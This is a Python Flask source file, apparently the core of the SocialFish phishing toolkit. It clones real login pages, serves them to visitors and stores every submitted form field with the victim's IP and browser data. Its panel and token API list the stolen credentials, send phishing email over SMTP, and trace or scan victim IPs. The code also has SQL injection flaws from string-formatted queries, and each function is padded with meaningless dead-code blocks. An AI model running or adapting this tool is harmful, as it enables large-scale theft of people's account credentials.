from flask import Flask, request, render_template, jsonify, redirect, g, flash
from core.config import *
from core.view import head
from core.scansf import nScan
from core.clonesf import clone
from core.dbsf import initDB
from core.genToken import genToken, genQRCode
from core.sendMail import sendMail
from core.tracegeoIp import tracegeoIp
from core.cleanFake import cleanFake
from core.genReport import genReport
from core.report import generate_unique
from datetime import date
from sys import argv, exit, version_info
import colorama
import sqlite3
import flask_login
import os
if len(argv) < 2:
    print('./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass')
    exit(0)
try:
    users = {argv[1]: {'password': argv[2]}}
except IndexError:
    print('./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass')
    exit(0)
app = Flask(__name__, static_url_path='', static_folder='templates/static')
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0

@app.before_request
def before_request():
    if False:
        for i in range(10):
            print('nop')
    g.db = sqlite3.connect(DATABASE)

@app.teardown_request
def teardown_request(exception):
    if False:
        print('Hello World!')
    if hasattr(g, 'db'):
        g.db.close()

def countCreds():
    if False:
        while True:
            i = 10
    count = 0
    cur = g.db
    select_all_creds = cur.execute('SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc')
    for i in select_all_creds:
        count += 1
    return count

def countNotPickedUp():
    if False:
        while True:
            i = 10
    count = 0
    cur = g.db
    select_clicks = cur.execute('SELECT clicks FROM socialfish where id = 1')
    for i in select_clicks:
        count = i[0]
    count = count - countCreds()
    return count
app.secret_key = APP_SECRET_KEY
login_manager = flask_login.LoginManager()
login_manager.init_app(app)

class User(flask_login.UserMixin):
    pass

@login_manager.user_loader
def user_loader(email):
    if False:
        print('Hello World!')
    if email not in users:
        return
    user = User()
    user.id = email
    return user

@login_manager.request_loader
def request_loader(request):
    if False:
        return 10
    email = request.form.get('email')
    if email not in users:
        return
    user = User()
    user.id = email
    user.is_authenticated = request.form['password'] == users[email]['password']
    return user

@app.route('/neptune', methods=['GET', 'POST'])
def admin():
    if False:
        i = 10
        return i + 15
    if request.method == 'GET':
        if flask_login.current_user.is_authenticated:
            return redirect('/creds')
        else:
            return render_template('signin.html')
    if request.method == 'POST':
        email = request.form['email']
        try:
            if request.form['password'] == users[email]['password']:
                user = User()
                user.id = email
                flask_login.login_user(user)
                return redirect('/creds')
            else:
                return 'bad'
        except:
            return 'bad'

@app.route('/')
def getLogin():
    if False:
        return 10
    if sta == 'clone':
        agent = request.headers.get('User-Agent').encode('ascii', 'ignore').decode('ascii')
        clone(url, agent, beef)
        o = url.replace('://', '-')
        cur = g.db
        cur.execute('UPDATE socialfish SET clicks = clicks + 1 where id = 1')
        g.db.commit()
        template_path = 'fake/{}/{}/index.html'.format(agent, o)
        return render_template(template_path)
    elif url == 'https://github.com/UndeadSec/SocialFish':
        return render_template('default.html')
    else:
        cur = g.db
        cur.execute('UPDATE socialfish SET clicks = clicks + 1 where id = 1')
        g.db.commit()
        return render_template('custom.html')

@app.route('/login', methods=['POST'])
def postData():
    if False:
        print('Hello World!')
    if request.method == 'POST':
        fields = [k for k in request.form]
        values = [request.form[k] for k in request.form]
        data = dict(zip(fields, values))
        browser = str(request.user_agent.browser)
        bversion = str(request.user_agent.version)
        platform = str(request.user_agent.platform)
        rip = str(request.remote_addr)
        d = '{:%m-%d-%Y}'.format(date.today())
        cur = g.db
        sql = 'INSERT INTO creds(url,jdoc,pdate,browser,bversion,platform,rip) VALUES(?,?,?,?,?,?,?)'
        creds = (url, str(data), d, browser, bversion, platform, rip)
        cur.execute(sql, creds)
        g.db.commit()
    return redirect(red)

@app.route('/configure', methods=['POST'])
def echo():
    if False:
        while True:
            i = 10
    global url, red, sta, beef
    red = request.form['red']
    sta = request.form['status']
    beef = request.form['beef']
    if sta == 'clone':
        url = request.form['url']
    else:
        url = 'Custom'
    if len(url) > 4 and len(red) > 4:
        if 'http://' not in url and sta != '1' and ('https://' not in url):
            url = 'http://' + url
        if 'http://' not in red and 'https://' not in red:
            red = 'http://' + red
    else:
        url = 'https://github.com/UndeadSec/SocialFish'
        red = 'https://github.com/UndeadSec/SocialFish'
    cur = g.db
    cur.execute('UPDATE socialfish SET attacks = attacks + 1 where id = 1')
    g.db.commit()
    return redirect('/creds')

@app.route('/creds')
@flask_login.login_required
def getCreds():
    if False:
        while True:
            i = 10
    cur = g.db
    attacks = cur.execute('SELECT attacks FROM socialfish where id = 1').fetchone()[0]
    clicks = cur.execute('SELECT clicks FROM socialfish where id = 1').fetchone()[0]
    tokenapi = cur.execute('SELECT token FROM socialfish where id = 1').fetchone()[0]
    data = cur.execute('SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc').fetchall()
    return render_template('admin/index.html', data=data, clicks=clicks, countCreds=countCreds, countNotPickedUp=countNotPickedUp, attacks=attacks, tokenapi=tokenapi)

@app.route('/mail', methods=['GET', 'POST'])
@flask_login.login_required
def getMail():
    if False:
        for i in range(10):
            print('nop')
    if request.method == 'GET':
        cur = g.db
        email = cur.execute('SELECT email FROM sfmail where id = 1').fetchone()[0]
        smtp = cur.execute('SELECT smtp FROM sfmail where id = 1').fetchone()[0]
        port = cur.execute('SELECT port FROM sfmail where id = 1').fetchone()[0]
        return render_template('admin/mail.html', email=email, smtp=smtp, port=port)
    if request.method == 'POST':
        subject = request.form['subject']
        email = request.form['email']
        password = request.form['password']
        recipient = request.form['recipient']
        body = request.form['body']
        smtp = request.form['smtp']
        port = request.form['port']
        sendMail(subject, email, password, recipient, body, smtp, port)
        cur = g.db
        cur.execute("UPDATE sfmail SET email = '{}' where id = 1".format(email))
        cur.execute("UPDATE sfmail SET smtp = '{}' where id = 1".format(smtp))
        cur.execute("UPDATE sfmail SET port = '{}' where id = 1".format(port))
        g.db.commit()
        return redirect('/mail')

@app.route('/single/<id>', methods=['GET'])
@flask_login.login_required
def getSingleCred(id):
    if False:
        print('Hello World!')
    try:
        sql = 'SELECT jdoc FROM creds where id = {}'.format(id)
        cur = g.db
        credInfo = cur.execute(sql).fetchall()
        if len(credInfo) > 0:
            return render_template('admin/singlecred.html', credInfo=credInfo)
        else:
            return 'Not found'
    except:
        return 'Bad parameter'

@app.route('/trace/<ip>', methods=['GET'])
@flask_login.login_required
def getTraceIp(ip):
    if False:
        for i in range(10):
            print('nop')
    try:
        traceIp = tracegeoIp(ip)
        return render_template('admin/traceIp.html', traceIp=traceIp, ip=ip)
    except:
        return 'Network Error'

@app.route('/scansf/<ip>', methods=['GET'])
@flask_login.login_required
def getScanSf(ip):
    if False:
        return 10
    return render_template('admin/scansf.html', nScan=nScan, ip=ip)

@app.route('/revokeToken', methods=['POST'])
@flask_login.login_required
def revokeToken():
    if False:
        while True:
            i = 10
    revoke = request.form['revoke']
    if revoke == 'yes':
        cur = g.db
        upsql = "UPDATE socialfish SET token = '{}' where id = 1".format(genToken())
        cur.execute(upsql)
        g.db.commit()
        token = cur.execute('SELECT token FROM socialfish where id = 1').fetchone()[0]
        genQRCode(token, revoked=True)
    return redirect('/creds')

@app.route('/report', methods=['GET', 'POST'])
@flask_login.login_required
def getReport():
    if False:
        return 10
    if request.method == 'GET':
        cur = g.db
        urls = cur.execute('SELECT DISTINCT url FROM creds').fetchall()
        users = cur.execute('SELECT name FROM professionals').fetchall()
        companies = cur.execute('SELECT name FROM companies').fetchall()
        uniqueUrls = []
        for u in urls:
            if u not in uniqueUrls:
                uniqueUrls.append(u[0])
        return render_template('admin/report.html', uniqueUrls=uniqueUrls, users=users, companies=companies)
    if request.method == 'POST':
        subject = request.form['subject']
        user = request.form['selectUser']
        company = request.form['selectCompany']
        date_range = request.form['datefilter']
        target = request.form['selectTarget']
        _target = 'All' if target == '0' else target
        genReport(DATABASE, subject, user, company, date_range, _target)
        generate_unique(DATABASE, _target)
        return redirect('/report')

@app.route('/professionals', methods=['GET', 'POST'])
@flask_login.login_required
def getProfessionals():
    if False:
        i = 10
        return i + 15
    if request.method == 'GET':
        return render_template('admin/professionals.html')
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        obs = request.form['obs']
        sql = 'INSERT INTO professionals(name,email,obs) VALUES(?,?,?)'
        info = (name, email, obs)
        cur = g.db
        cur.execute(sql, info)
        g.db.commit()
        return redirect('/professionals')

@app.route('/companies', methods=['GET', 'POST'])
@flask_login.login_required
def getCompanies():
    if False:
        while True:
            i = 10
    if request.method == 'GET':
        return render_template('admin/companies.html')
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        site = request.form['site']
        sql = 'INSERT INTO companies(name,email,phone,address,site) VALUES(?,?,?,?,?)'
        info = (name, email, phone, address, site)
        cur = g.db
        cur.execute(sql, info)
        g.db.commit()
        return redirect('/companies')

@app.route('/sfusers/', methods=['GET'])
@flask_login.login_required
def getSfUsers():
    if False:
        for i in range(10):
            print('nop')
    return render_template('admin/sfusers.html')

@app.route('/logout')
def logout():
    if False:
        print('Hello World!')
    flask_login.logout_user()
    return 'Logged out'

@login_manager.unauthorized_handler
def unauthorized_handler():
    if False:
        for i in range(10):
            print('nop')
    return 'Unauthorized'

@app.route('/api/checkKey/<key>', methods=['GET'])
def checkKey(key):
    if False:
        print('Hello World!')
    cur = g.db
    tokenapi = cur.execute('SELECT token FROM socialfish where id = 1').fetchone()[0]
    if key == tokenapi:
        status = {'status': 'ok'}
    else:
        status = {'status': 'bad'}
    return jsonify(status)

@app.route('/api/statistics/<key>', methods=['GET'])
def getStatics(key):
    if False:
        while True:
            i = 10
    cur = g.db
    tokenapi = cur.execute('SELECT token FROM socialfish where id = 1').fetchone()[0]
    if key == tokenapi:
        cur = g.db
        attacks = cur.execute('SELECT attacks FROM socialfish where id = 1').fetchone()[0]
        clicks = cur.execute('SELECT clicks FROM socialfish where id = 1').fetchone()[0]
        countC = countCreds()
        countNPU = countNotPickedUp()
        info = {'status': 'ok', 'attacks': attacks, 'clicks': clicks, 'countCreds': countC, 'countNotPickedUp': countNPU}
    else:
        info = {'status': 'bad'}
    return jsonify(info)

@app.route('/api/getJson/<key>', methods=['GET'])
def getJson(key):
    if False:
        print('Hello World!')
    cur = g.db
    tokenapi = cur.execute('SELECT token FROM socialfish where id = 1').fetchone()[0]
    if key == tokenapi:
        try:
            sql = 'SELECT * FROM creds'
            cur = g.db
            credInfo = cur.execute(sql).fetchall()
            listCreds = []
            if len(credInfo) > 0:
                for c in credInfo:
                    cred = {'id': c[0], 'url': c[1], 'post': c[2], 'date': c[3], 'browser': c[4], 'version': c[5], 'os': c[6], 'ip': c[7]}
                    listCreds.append(cred)
            else:
                credInfo = {'status': 'nothing'}
            return jsonify(listCreds)
        except:
            return 'Bad parameter'
    else:
        credInfo = {'status': 'bad'}
        return jsonify(credInfo)

@app.route('/api/configure', methods=['POST'])
def postConfigureApi():
    if False:
        i = 10
        return i + 15
    global url, red, sta, beef
    if request.is_json:
        content = request.get_json()
        cur = g.db
        tokenapi = cur.execute('SELECT token FROM socialfish where id = 1').fetchone()[0]
        if content['key'] == tokenapi:
            red = content['red']
            beef = content['beef']
            if content['sta'] == 'clone':
                sta = 'clone'
                url = content['url']
            else:
                sta = 'custom'
                url = 'Custom'
            if url != 'Custom':
                if len(url) > 4:
                    if 'http://' not in url and sta != '1' and ('https://' not in url):
                        url = 'http://' + url
            if len(red) > 4:
                if 'http://' not in red and 'https://' not in red:
                    red = 'http://' + red
            else:
                red = 'https://github.com/UndeadSec/SocialFish'
            cur = g.db
            cur.execute('UPDATE socialfish SET attacks = attacks + 1 where id = 1')
            g.db.commit()
            status = {'status': 'ok'}
        else:
            status = {'status': 'bad'}
    else:
        status = {'status': 'bad'}
    return jsonify(status)

@app.route('/api/mail', methods=['POST'])
def postSendMail():
    if False:
        return 10
    if request.is_json:
        content = request.get_json()
        cur = g.db
        tokenapi = cur.execute('SELECT token FROM socialfish where id = 1').fetchone()[0]
        if content['key'] == tokenapi:
            subject = content['subject']
            email = content['email']
            password = content['password']
            recipient = content['recipient']
            body = content['body']
            smtp = content['smtp']
            port = content['port']
            if sendMail(subject, email, password, recipient, body, smtp, port) == 'ok':
                cur = g.db
                cur.execute("UPDATE sfmail SET email = '{}' where id = 1".format(email))
                cur.execute("UPDATE sfmail SET smtp = '{}' where id = 1".format(smtp))
                cur.execute("UPDATE sfmail SET port = '{}' where id = 1".format(port))
                g.db.commit()
                status = {'status': 'ok'}
            else:
                status = {'status': 'bad', 'error': str(sendMail(subject, email, password, recipient, body, smtp, port))}
        else:
            status = {'status': 'bad'}
    else:
        status = {'status': 'bad'}
    return jsonify(status)

@app.route('/api/trace/<key>/<ip>', methods=['GET'])
def getTraceIpMob(key, ip):
    if False:
        return 10
    cur = g.db
    tokenapi = cur.execute('SELECT token FROM socialfish where id = 1').fetchone()[0]
    if key == tokenapi:
        try:
            traceIp = tracegeoIp(ip)
            return jsonify(traceIp)
        except:
            content = {'status': 'bad'}
            return jsonify(content)
    else:
        content = {'status': 'bad'}
        return jsonify(content)

@app.route('/api/scansf/<key>/<ip>', methods=['GET'])
def getScanSfMob(key, ip):
    if False:
        return 10
    cur = g.db
    tokenapi = cur.execute('SELECT token FROM socialfish where id = 1').fetchone()[0]
    if key == tokenapi:
        return jsonify(nScan(ip))
    else:
        content = {'status': 'bad'}
        return jsonify(content)

@app.route('/api/infoReport/<key>', methods=['GET'])
def getReportMob(key):
    if False:
        i = 10
        return i + 15
    cur = g.db
    tokenapi = cur.execute('SELECT token FROM socialfish where id = 1').fetchone()[0]
    if key == tokenapi:
        urls = cur.execute('SELECT url FROM creds').fetchall()
        users = cur.execute('SELECT name FROM professionals').fetchall()
        comp = cur.execute('SELECT name FROM companies').fetchall()
        uniqueUrls = []
        professionals = []
        companies = []
        for c in comp:
            companies.append(c[0])
        for p in users:
            professionals.append(p[0])
        for u in urls:
            if u not in uniqueUrls:
                uniqueUrls.append(u[0])
        info = {'urls': uniqueUrls, 'professionals': professionals, 'companies': companies}
        return jsonify(info)
    else:
        return jsonify({'status': 'bad'})

def main():
    if False:
        for i in range(10):
            print('nop')
    if version_info < (3, 0, 0):
        print('[!] Please use Python 3. $ python3 SocialFish.py')
        exit(0)
    head()
    cleanFake()
    initDB(DATABASE)
    app.run(host='0.0.0.0', port=5000)
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit(0)